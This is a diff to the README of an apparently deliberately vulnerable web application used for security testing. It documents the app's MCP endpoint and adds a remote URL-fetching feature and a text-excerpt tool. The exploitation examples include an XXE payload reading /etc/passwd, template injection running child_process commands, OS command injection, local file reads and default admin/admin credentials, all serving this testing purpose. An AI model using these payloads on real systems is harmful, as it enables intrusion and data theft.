@@ -1233,10 +1233,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
   - **Sensitive Data Exposure via get_config** - The `get_config` returns application configuration including database credentials, API keys, and cloud storage URLs.
   - **Server-Side Template Injection via render** - The `render` accepts a custom template string that is compiled and executed using the doT template engine, allowing arbitrary code execution.
   - **Local File Inclusion via MCP resources/read** - The `resources/read` method accepts `file://` URIs and proxies `/api/file/raw`, allowing arbitrary file reads such as `file:///etc/hosts`.
+  - **Remote Content Relay via MCP resources/read** - The same `resources/read` method also accepts arbitrary `http://` and `https://` URIs and relays the raw remote response body in `result.contents[].text`.
   - **Server-Side JavaScript Injection via process_numbers** - The `process_numbers` proxies `/api/process_numbers` and executes arbitrary JavaScript from the `processing_expression` expression in server context.
   - **XML External Entity via get_metadata** - The `get_metadata` proxies `/api/metadata` and processes attacker-controlled XML with external entities enabled (same vulnerability class as `/api/metadata`).
   - **Broken Access Control via search_users** - The `search_users` proxies `/api/users/search/:name` and returns `application/json` search results.
   - **Prototype Pollution via update_user** - The `update_user` tool returns top-level `name`/`email`/`username`/`phone` fields plus everything inside attacker-controlled `__proto__` payload fields.
+  - **Text Relay via excerpt_text** - The `excerpt_text` tool returns user-supplied text truncated to at most 1000 symbols.
   - **OS Command Injection via spawn_process** - The `spawn_process` executes arbitrary operating system commands through MCP (same vulnerability class as `/api/spawn`) and streams progress over event-stream.
   - **Authentication and Session Management** - The `/api/mcp` endpoint supports optional authentication and per-client session tracking:
 
@@ -1317,7 +1319,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
        ```
 
     3. `resources/list` + `resources/read` (public)  
-       Vulnerability: **Local File Inclusion (LFI)** via `file://` URI read from `/api/file/raw`.  
+       Behaviors: **Local File Inclusion (LFI)** via `file://` and **remote content relay** via `http(s)://`. `resources/list` advertises the example resources `local_file` and `remote_file`.  
        Example:
 
        ```bash
@@ -1341,9 +1343,42 @@ Full configuration & usage examples can be found in our [demo project](https://g
            },
            "id": 5
          }'
+
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "resources/read",
+           "params": {
+             "uri": "https://test-host.example.com/remote-payload"
+           },
+           "id": 6
+         }'
        ```
 
-    4. `process_numbers` (public)  
+    4. `excerpt_text` (public)  
+       Behavior: Returns the provided text truncated to at most 1000 symbols.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+             "name": "excerpt_text",
+             "arguments": {
+               "text": "Quarterly earnings rose 12% year-over-year, driven by strong performance in the cloud services segment."
+             }
+           },
+           "id": 7
+         }'
+       ```
+
+    5. `process_numbers` (public)  
        Vulnerability: **Server-Side JavaScript Injection (SSJI)** via dynamic code execution.  
        Example:
 
@@ -1361,11 +1396,11 @@ Full configuration & usage examples can be found in our [demo project](https://g
               "processing_expression": "numbers.reduce((acc, num) => acc + num, 0)"
             }
           },
-         "id": 6
+         "id": 8
          }'
        ```
 
-    5. `get_metadata` (public)  
+    6. `get_metadata` (public)  
        Vulnerability: **XML External Entity (XXE)** via proxied `/api/metadata` XML parsing.  
        Example:
 
@@ -1382,11 +1417,11 @@ Full configuration & usage examples can be found in our [demo project](https://g
               "xml": "<root><username>John</username></root>"
             }
           },
-         "id": 7
+         "id": 9
          }'
        ```
 
-    6. `search_users` (public)  
+    7. `search_users` (public)  
        Vulnerability: **Broken Access Control** via proxied user search.  
        Example:
 
@@ -1403,11 +1438,11 @@ Full configuration & usage examples can be found in our [demo project](https://g
               "name": "ad"
             }
           },
-         "id": 8
+         "id": 10
          }'
        ```
 
-    7. `update_user` (public)  
+    8. `update_user` (public)  
        Vulnerability: **Prototype Pollution** via attacker-controlled `__proto__` object fields.  
        Example:
 
@@ -1432,11 +1467,11 @@ Full configuration & usage examples can be found in our [demo project](https://g
               }
             }
           },
-         "id": 9
+         "id": 11
          }'
        ```
 
-    8. `spawn_process` (admin only)  
+    9. `spawn_process` (admin only)  
        Vulnerability: **OS Command Injection** with progress notifications over SSE.  
        Example:
 
@@ -1453,7 +1488,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
               "command": "ping -c 4 127.0.0.1"
             }
           },
-          "id": 10
+          "id": 12
          }'
        ```
 
@@ -1464,37 +1499,37 @@ Full configuration & usage examples can be found in our [demo project](https://g
        - `event: notification` with method `notifications/partial_output` for stdout/stderr chunks
        - `event: message` containing final JSON-RPC tool result
 
-    9. `get_config` (admin only)  
-       Vulnerability: **Sensitive Data Exposure** (returns app configuration including secrets when allowed).  
-       Example (admin-authenticated MCP session):
+    10. `get_config` (admin only)  
+        Vulnerability: **Sensitive Data Exposure** (returns app configuration including secrets when allowed).  
+        Example (admin-authenticated MCP session):
 
-       ```bash
-       AUTH_HEADERS=$(curl -i -s "${BASE}/api/auth/admin/login" -X POST \
-         -H 'Content-Type: application/json' \
-         -d '{"user":"admin","password":"admin","op":"basic"}')
-       ADMIN_AUTH=$(echo "$AUTH_HEADERS" | awk -F': ' 'tolower($1)=="authorization"{print $2}' | tr -d '\r')
+    ```bash
+    AUTH_HEADERS=$(curl -i -s "${BASE}/api/auth/admin/login" -X POST \
+      -H 'Content-Type: application/json' \
+      -d '{"user":"admin","password":"admin","op":"basic"}')
+    ADMIN_AUTH=$(echo "$AUTH_HEADERS" | awk -F': ' 'tolower($1)=="authorization"{print $2}' | tr -d '\r')
 
-       ADMIN_INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
-         -H 'Content-Type: application/json' \
-         -H "Authorization: ${ADMIN_AUTH}" \
-         -d '{"jsonrpc":"2.0","method":"initialize","id":4}')
-       ADMIN_MCP_SESSION_ID=$(echo "$ADMIN_INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')
+    ADMIN_INIT=$(curl -i -s "${BASE}/api/mcp" -X POST \
+      -H 'Content-Type: application/json' \
+      -H "Authorization: ${ADMIN_AUTH}" \
+      -d '{"jsonrpc":"2.0","method":"initialize","id":4}')
+    ADMIN_MCP_SESSION_ID=$(echo "$ADMIN_INIT" | awk -F': ' 'tolower($1)=="mcp-session-id"{print $2}' | tr -d '\r')
 
-       curl "${BASE}/api/mcp" -X POST \
-         -H 'Content-Type: application/json' \
-         -H "Mcp-Session-Id: ${ADMIN_MCP_SESSION_ID}" \
-         -d '{
-           "jsonrpc": "2.0",
-           "method": "tools/call",
-           "params": {
-             "name": "get_config",
-             "arguments": {
-               "include_sensitive": true
-             }
-           },
-           "id": 11
-         }'
-       ```
+    curl "${BASE}/api/mcp" -X POST \
+      -H 'Content-Type: application/json' \
+      -H "Mcp-Session-Id: ${ADMIN_MCP_SESSION_ID}" \
+      -d '{
+        "jsonrpc": "2.0",
+        "method": "tools/call",
+        "params": {
+          "name": "get_config",
+          "arguments": {
+            "include_sensitive": true
+          }
+        },
+        "id": 13
+      }'
+    ```
 
   <details>
     <summary>MCP Vulnerabilities Example Exploitation</summary>
@@ -1597,7 +1632,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
      }
      ```
 
-  4. **Local File Inclusion via resources/read**:
+  4. **resources/read via local and remote URIs**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
@@ -1615,7 +1650,44 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
      This payload reads local server files through the `/api/file/raw` proxy using a `file://` URI.
 
-  5. **Server-Side JavaScript Injection via process_numbers**:
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "resources/read",
+         "params": {
+           "uri": "https://test-host.example.com/remote-payload"
+         },
+         "id": 6
+       }'
+     ```
+
+     This payload fetches a remote document and returns the raw body in `result.contents[].text`.
+
+  5. **Text Relay via excerpt_text**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "excerpt_text",
+           "arguments": {
+             "text": "Quarterly earnings rose 12% year-over-year, driven by strong performance in the cloud services segment."
+           }
+         },
+         "id": 7
+       }'
+     ```
+
+     This payload returns the same text in `result.content[].text`, truncated to at most 1000 symbols.
+
+  6. **Server-Side JavaScript Injection via process_numbers**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
@@ -1631,13 +1703,13 @@ Full configuration & usage examples can be found in our [demo project](https://g
              "processing_expression": "numbers.reduce((acc, num) => acc + num, 0)"
            }
          },
-         "id": 6
+         "id": 8
        }'
      ```
 
      This payload executes JavaScript directly on the server.
 
-  6. **XML External Entity via get_metadata**:
+  7. **XML External Entity via get_metadata**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
@@ -1652,13 +1724,13 @@ Full configuration & usage examples can be found in our [demo project](https://g
              "xml": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE replace [<!ENTITY mcp_xxe SYSTEM \"file://etc/passwd\">]><root>&mcp_xxe;</root>"
            }
          },
-         "id": 7
+         "id": 9
        }'
      ```
 
      This payload proxies XML with external entity definitions to `/api/metadata`.
 
-  7. **User Search Enumeration via search_users**:
+  8. **User Search Enumeration via search_users**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
@@ -1673,13 +1745,13 @@ Full configuration & usage examples can be found in our [demo project](https://g
              "name": "ad"
            }
          },
-         "id": 8
+         "id": 10
        }'
      ```
 
      This payload proxies `/api/users/search/:name` and returns JSON user search results.
 
-  8. **Prototype Pollution via update_user**:
+  9. **Prototype Pollution via update_user**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
@@ -1700,34 +1772,34 @@ Full configuration & usage examples can be found in our [demo project](https://g
              }
            }
          },
-         "id": 9
+         "id": 11
        }'
      ```
 
      This payload returns only top-level `name`/`email`/`username`/`phone` fields and all fields under `payload.__proto__`.
 
-  9. **OS Command Injection via spawn_process**:
+  10. **OS Command Injection via spawn_process**:
 
-     ```bash
-     curl -N "${BASE}/api/mcp" -X POST \
-       -H 'Content-Type: application/json' \
-       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
-       -d '{
-         "jsonrpc": "2.0",
-         "method": "tools/call",
-         "params": {
-           "name": "spawn_process",
-           "arguments": {
-             "command": "uname -a"
-           }
-         },
-         "id": 10
-       }'
-     ```
+  ```bash
+  curl -N "${BASE}/api/mcp" -X POST \
+    -H 'Content-Type: application/json' \
+    -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+    -d '{
+      "jsonrpc": "2.0",
+      "method": "tools/call",
+      "params": {
+        "name": "spawn_process",
+        "arguments": {
+          "command": "uname -a"
+        }
+      },
+      "id": 12
+    }'
+  ```
 
-     Response is streamed as SSE and ends with an `event: message` JSON-RPC payload containing command output.
+  Response is streamed as SSE and ends with an `event: message` JSON-RPC payload containing command output.
 
-  10. **Server-Side Template Injection via render**:
+  11. **Server-Side Template Injection via render**:
 
   ```bash
   curl "${BASE}/api/mcp" -X POST \
@@ -1743,7 +1815,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
           "template": "{{= global.process.mainModule.require('\''child_process'\'').execSync('\''ls -la'\'') }}"
         }
       },
-      "id": 11
+      "id": 13
     }'
   ```
 
